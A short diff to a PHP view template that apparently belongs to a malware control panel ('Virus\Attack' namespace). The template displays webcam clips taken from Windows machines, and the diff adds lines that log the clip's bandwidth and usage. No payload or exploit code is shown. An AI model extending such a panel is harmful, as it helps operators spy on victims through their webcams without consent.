@@ -1,6 +1,9 @@
 <?php
 /** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\Webcam\Webcam $attack */
 
+$attack->usage()->addBandwidth(filesize($attack->getClipPath()))->saveState();
+$attack->reportDynamicUsage();
+
 if ($attack->hasWebcam()) { ?>
     <br><br>
     <video controls>
